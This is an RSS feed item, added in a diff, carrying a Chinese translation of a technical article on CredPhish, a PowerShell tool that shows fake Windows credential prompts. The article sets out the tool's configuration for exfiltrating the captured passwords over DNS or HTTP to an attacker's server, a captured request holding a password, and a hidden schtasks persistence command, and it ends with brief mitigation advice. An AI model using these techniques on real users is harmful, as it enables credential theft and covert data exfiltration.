@@ -1,0 +1,157 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>钓鱼攻击 on 办公AI智能小助手</title>
+        <link>http://localhost:1313/tags/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB/</link>
+        <description>Recent content in 钓鱼攻击 on 办公AI智能小助手</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>zh-cn</language>
+        <copyright>qife</copyright>
+        <lastBuildDate>Sun, 03 Aug 2025 18:13:46 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>使用PowerShell进行用户密码钓鱼的技术解析</title>
+        <link>http://localhost:1313/p/%E4%BD%BF%E7%94%A8powershell%E8%BF%9B%E8%A1%8C%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%92%93%E9%B1%BC%E7%9A%84%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</link>
+        <pubDate>Sun, 03 Aug 2025 18:13:46 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E4%BD%BF%E7%94%A8powershell%E8%BF%9B%E8%A1%8C%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%92%93%E9%B1%BC%E7%9A%84%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</guid>
+        <description>&lt;h1 id=&#34;使用powershell进行用户密码钓鱼的技术解析&#34;&gt;使用PowerShell进行用户密码钓鱼的技术解析
+&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;tokyoneon&lt;/strong&gt; //&lt;br&gt;
+伪造凭证提示是一种有效的权限提升和横向移动技术。在Windows环境中，用户经常会遇到看似随机的密码提示，例如Outlook、VPN和其他各种认证协议。攻击者会滥用Windows和PowerShell内置功能来调用凭证弹窗以获取用户密码。&lt;/p&gt;
+&lt;p&gt;根据&lt;strong&gt;MITRE ATT&amp;amp;CK框架&lt;/strong&gt;的定义：&lt;br&gt;
+“当需要额外权限的程序执行时，操作系统通常会提示用户输入正确的凭证以授权任务的提升权限。攻击者可能会模仿常见的操作系统组件，通过PowerShell等语言显示看似合法的凭证提示。”&lt;/p&gt;
+&lt;h2 id=&#34;什么是credphish&#34;&gt;什么是CredPhish？
+&lt;/h2&gt;&lt;p&gt;CredPhish是一个PowerShell脚本，旨在调用凭证提示并窃取密码。它依赖于&lt;strong&gt;CredentialPicker API&lt;/strong&gt;收集用户密码，使用PowerShell的&lt;strong&gt;Resolve-DnsName&lt;/strong&gt;进行DNS外传数据，并利用Windows Defender的&lt;strong&gt;ConfigSecurityPolicy.exe&lt;/strong&gt;执行任意GET请求。&lt;/p&gt;
+&lt;p&gt;下图展示了CredPhish的实际操作。请注意，在Windows安全提示中提交凭证后，凭证会立即发送到攻击者的DNS服务器。&lt;/p&gt;
+&lt;p&gt;默认情况下，CredPhish会使用PowerShell内置的DNS解析器&lt;strong&gt;Resolve-DnsName&lt;/strong&gt;外传凭证。它会将凭证中的每个字符转换为十六进制值，将转换后的值分成预定义的块，并将这些块放入热门网站的子域名中。以下截图显示了十六进制形式的外传凭证示例。注意“tokyoneon”的十六进制值（746f6b796f6e656f6e）出现在google.com和office.com的子域名中。&lt;/p&gt;
+&lt;p&gt;在解析DNS查询之前，DNS服务器会剥离十六进制子域名以避免生成大量错误响应。在下面的Wireshark截图中，请注意“Answers”字段不再包含子域名，并成功解析为Google的一个IP地址。&lt;/p&gt;
+&lt;h2 id=&#34;credphishps1配置&#34;&gt;CredPhish.ps1配置
+&lt;/h2&gt;&lt;p&gt;CredPhish.ps1设计为一个独立的脚本，不需要&lt;strong&gt;Import-Module&lt;/strong&gt;（这是一种常见的攻击指标）。可配置选项以变量的形式位于PS1脚本的顶部，以避免冗长的命令行参数。&lt;/p&gt;
+&lt;p&gt;第一行是最重要的，它定义了外传数据的接收地址（即攻击者的Kali服务器）：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;# exfil address  &lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$exfilServer&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;192.168.56.112&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;接下来的几个变量定义了提示框对目标用户的显示方式。&lt;strong&gt;$promptCaption&lt;/strong&gt;定义了请求凭证的“应用程序”（例如“Microsoft Office”），而**$promptMessage**通常指定与请求关联的账户。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;# prompt&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$targetUser&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$env:username&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$companyEmail&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;blackhillsinfosec.com&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$promptCaption&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Microsoft Office&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$promptMessage&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Connecting to: &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$targetUser&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$companyEmail&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$maxTries&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;c&#34;&gt;# 提示框的最大调用次数&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$delayPrompts&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;c&#34;&gt;# 提示框之间的延迟（秒）&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$validateCredentials&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;$false&lt;/span&gt; &lt;span class=&#34;c&#34;&gt;# 如果凭证有效，则中断$maxTries并立即外传&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;$maxTries&lt;/strong&gt;变量定义了提示框在目标提交凭证之前显示的次数。默认值为&lt;strong&gt;1&lt;/strong&gt;以避免引起怀疑。&lt;strong&gt;$delayPrompts&lt;/strong&gt;变量定义了每次提示之间的延迟时间（如果**$maxTries&lt;strong&gt;大于1）。&lt;/strong&gt;$validateCredentials&lt;strong&gt;默认禁用，它会尝试通过在高权限上下文中使用&lt;/strong&gt;Start-Process&lt;strong&gt;来本地验证提交的凭证。如果启用且凭证验证通过，则忽略&lt;/strong&gt;$maxTries**，数据会立即发送到攻击者的服务器。&lt;/p&gt;
+&lt;h2 id=&#34;数据外传方法&#34;&gt;数据外传方法
+&lt;/h2&gt;&lt;p&gt;如前所述，DNS外传是默认的密码传输方法。&lt;strong&gt;$exfilDomains&lt;/strong&gt;列表包含用于DNS查询的各种域名，并随机选择。&lt;strong&gt;$subdomainLength&lt;/strong&gt;变量确定每个子域名的期望长度。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;# dns&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;# 在Kali中启动DNS服务器：python3 /path/to/credphish/dns_server.py&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$enableDnsExfil&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;$true&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$exfilDomains&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;.microsoft.com&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;.google.com&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;.office.com&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;.live.com&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c&#34;&gt;# 用于DNS外传的域名&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$randomDelay&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;get-random&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-minimum&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;5&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-maximum&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;c&#34;&gt;# DNS查询之间的随机延迟&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$subdomainLength&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;6&lt;/span&gt; &lt;span class=&#34;c&#34;&gt;# 子域名的最大字符数。必须是2-60之间的偶数，否则查询会中断&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;要拦截通过DNS外传功能发送的凭证，请在Kali中执行&lt;strong&gt;dns_server.py&lt;/strong&gt;脚本。按&lt;strong&gt;Ctrl + c&lt;/strong&gt;终止DNS服务器，它将重建拦截的明文凭证。&lt;/p&gt;
+&lt;p&gt;CredPhish内置的另一种外传方法是HTTP请求。它利用Windows Defender中包含的二进制文件“ConfigSecurityPolicy.exe”将凭证发送到攻击者的服务器。将**$enableHttpExfil&lt;strong&gt;变量设置为&lt;/strong&gt;$true**以启用它。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;# http&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;# 在Kali中启动HTTP服务器：python3 -m http.server 80&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$enableHttpExfil&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;$false&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$ConfigSecurityPolicy&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;C:\Prog*Files\Win*Defender\ConfigSecurityPolicy.exe&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;要拦截通过&lt;strong&gt;ConfigSecurityPolicy.exe&lt;/strong&gt;发送的凭证，请在Kali中启动一个简单的HTTP服务器以在日志中捕获它们。&lt;/p&gt;
+&lt;p&gt;在网络中，外传的凭证会显示如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;GET /DESKTOP-S4DAAF0%5Btokyoneon%3A%23!Extr3m3Ly_%26ecuRe-P%40ssw%25rD%23%5D HTTP/1.1  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Accept: */*  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;UA-CPU: AMD64  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Accept-Encoding: gzip, deflate  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host: 192.168.56.104  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Connection: Keep-Alive
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;由于凭证在传输前进行了URL编码，可以使用Burp的Decoder模块或Python的&lt;strong&gt;urllib&lt;/strong&gt;库通过命令行进行URL解码。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;urllib.parse&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;unquote&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;unquote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/DESKTOP-S4DAAF0%5Btokyoneon%3A%23!Extr3m3Ly_&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%26e&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;cuRe-P&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%40s&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;sw&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%25r&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;D&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%23%&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;5D&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/DESKTOP-S4DAAF0[tokyoneon:#!Extr3m3Ly_&amp;amp;ecuRe-P@ssw&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%r&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;D#]&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;credphishps1执行&#34;&gt;CredPhish.ps1执行
+&lt;/h2&gt;&lt;p&gt;要快速测试CredPhish，请将&lt;strong&gt;credphish.ps1&lt;/strong&gt;移动到目标Windows 10机器并使用PowerShell执行它。&lt;/p&gt;
+&lt;p&gt;一种持久化执行方法可能涉及&lt;strong&gt;任务计划程序&lt;/strong&gt;，这是Windows的一个组件，允许在预定义的时间间隔调度脚本执行。以下&lt;strong&gt;schtasks&lt;/strong&gt;示例将每2分钟执行一次&lt;strong&gt;credphish.ps1&lt;/strong&gt;。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;schtasks&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;create&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;sc &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;minute&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mo&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tn&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;credphish&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tr&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;powershell -ep bypass -WindowStyle Hidden C:\path\to\credPhish\credphish.ps1&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;缓解与检测&#34;&gt;缓解与检测
+&lt;/h2&gt;&lt;p&gt;CredPhish源自&lt;strong&gt;Invoke-LoginPrompt&lt;/strong&gt;、&lt;strong&gt;CredsLeaker&lt;/strong&gt;和&lt;strong&gt;Stitch&lt;/strong&gt;等项目，并不是密码钓鱼的终极解决方案。由于此类攻击通常非常针对用户，因此仍有改进空间。更激进的方法可能涉及使用Cobalt Strike伪造整个Windows 10锁屏并通过这种方式捕获凭证。&lt;/p&gt;
+&lt;p&gt;这类攻击技术难以通过预防性控制措施缓解，因为它们滥用了系统功能。&lt;strong&gt;MITRE ATT&amp;amp;CK框架&lt;/strong&gt;建议：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;通过&lt;strong&gt;用户培训&lt;/strong&gt;提高对潜在恶意事件和对话框（例如Office文档提示输入凭证）的意识和警惕性。&lt;/li&gt;
+&lt;li&gt;监控进程执行，检测异常程序和恶意实例的&lt;strong&gt;命令和脚本解释器&lt;/strong&gt;，这些程序可能会提示用户输入凭证。&lt;/li&gt;
+&lt;li&gt;检查并审查输入提示的非法性指标，例如非传统的横幅、文本、时间和/或来源。&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
